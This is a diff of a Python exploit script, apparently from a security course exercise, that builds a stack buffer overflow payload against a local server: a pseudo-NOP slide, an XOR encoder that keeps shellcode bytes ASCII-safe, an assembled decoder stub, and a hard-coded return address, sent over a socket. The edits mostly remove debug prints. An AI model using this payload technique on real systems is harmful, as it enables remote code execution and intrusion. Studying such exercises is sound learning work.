@@ -8,15 +8,16 @@ HOST        = '127.0.0.1'
 SERVER_PORT = 8000
 LOCAL_PORT  = 1337
 
-
+TOTAL_SIZE = 1040
 ASCII_MAX = 0x7f
 
 def get_nop_slide(number_of_nops):
-	data = 'inc esi\ndec esi\n' * (number_of_nops/2) #creating the "nop" slide made of inc ecx & dec ecx
+    #creating the "nop" slide made of inc ecx & dec ecx
+	data = 'inc esi\ndec esi\n' * (number_of_nops/2) 
 	if(number_of_nops%2 != 0):
-		data = data + 'inc esi\n' #if the length of the nop slide is odd add one mroe inc ecx
+        #if the length of the nop slide is odd add one mroe inc ecx
+		data = data + 'inc esi\n' 
 	nop_slide = assemble.assemble_data(data)
-	print('nop slide length: ' + str(len(nop_slide)))
 	return nop_slide
 
 
@@ -32,8 +33,6 @@ def encoder(shellcode, length):
         else:
         	offset += 1
         	encoded_shellcode = encoded_shellcode + c
-    print('encoded shellcode length:' + str(len(encoded_shellcode)))
-    print pos
     return encoded_shellcode, pos
 
 def get_decoder(length, pos):
@@ -43,16 +42,12 @@ def get_decoder(length, pos):
 	# push 0
     # pop ebx
     # dec ebx 
+    # inc eax ;pos[i] times where i is the ith encoded byte
     # xor byte ptr [eax], bl ; repeat |shellcode| times
-    # dec eax
-	#data = 'push esp\npop eax\n' + 'dec eax\n' * (length+4) + 'push 0\npop ebx\ndec ebx\n' + 'xor byte ptr [eax], bl\ndec eax\n' * length
 	data = 'push esp\npop eax\n' + 'dec eax\n' * 4 + 'push 0\npop ebx\ndec ebx\n' + 'dec eax\n' * length
 	for i in range(len(pos)):
 		data = data + 'inc eax\n' * (pos[i]) + 'xor byte ptr [eax], bl\n'
-		#print('offset for decoder: ' + str(pos[i]) + ' and in hex: ' + str(hex(pos[i])))
-	# print(data)
 	decoder = assemble.assemble_data(data)
-	print('decoder length:' + str(len(decoder)))
 	return decoder
 
 def get_raw_shellcode():
@@ -66,37 +61,14 @@ def get_shellcode():
     From this function you should return only the shellcode!
     '''
     shellcode = get_raw_shellcode()
-    print('raw shellcode length: ' + str(len(shellcode)))
-    encoded_shellcode, pos = encoder(shellcode, len(shellcode)) #encode the shellcode
-    # view = ''
-    # for c in new_shellcode:
-    # 	view = view + str(hex(ord(c))) + ' '
-    # print(view)
+
+    # encode the shellcode
+    encoded_shellcode, pos = encoder(shellcode, len(shellcode)) 
+
+    # create a decoder for the encoded shellcode
     decoder = get_decoder(len(encoded_shellcode), pos);
-    print('decoder + encoded shellcode length: ' + str(len(decoder+shellcode)))
+
     return decoder + encoded_shellcode
-
-    # for i in range(length):
-    #     # xor byte ptr [eax], bl
-    #     # dec eax
-    #     new_shellcode = '\x30\x18\x48' + new_shellcode
-    # # push 0
-    # # pop ebx
-    # # dec ebx #now ebx is 0xffffffff and thus bl = 0xff
-    # new_shellcode = '\x6a\x00\x5b\x4b' + new_shellcode
-    
-    # # dec eax ;|shellcode| + 4 times
-    # for i in range(len(shellcode)+4):
-    #     new_shellcode = 'x48' + new_shellcode
-
-    # # push esp
-    # # pop eax ;eax now holds the end address of the encoded shellcode    
-    # new_shellcode = '\x54\x58' + new_shellcode 
-
-
-    # return new_shellcode
-
-    # Encode the shellcode
 
     # NOTES:
     # 1. Don't delete this function - we are going to test it directly.
@@ -111,13 +83,21 @@ def get_payload():
     shellcode and the return address.
     '''
 
-    total_size = 1040 #Size of the payload not including the first 4 bytes
+    #Size of the payload not including the first 4 bytes
+    TOTAL_SIZE = 1040 
     shellcode = get_shellcode()
-    number_of_nops = total_size - len (shellcode)#Calculate the size of the nop slide
-    ra = 0xbfffddcc + int(number_of_nops/2) #land in the middle of nopslide, for testing on debug used static vlaue of 0xbfffde0e + 450 = 0xbfffdfd0
+
+    # Calculate the size of the nop slide
+    number_of_nops = TOTAL_SIZE - len (shellcode)
+
+    # Calculate the return address so that we will land in the middle of nop slide
+    ra = 0xbfffddcc + int(number_of_nops/2) 
+
+    # Generate the pseudo NOP slide
     nop_slide = get_nop_slide(number_of_nops)
+
+    # All together now!
     payload = nop_slide + shellcode + str(struct.pack('<L', ra))
-    print('nop_slide + decoder + encoded shellcode length: ' + str(len(nop_slide + shellcode)))
     return str(struct.pack('>L', len(payload))) + payload
 
     # NOTE:
@@ -127,7 +107,6 @@ def get_payload():
 
 def main():
     payload = get_payload()
-    print('payload len: ' + str(len(payload)))
     conn = socket.socket()
     conn.connect((HOST, SERVER_PORT))
     try:
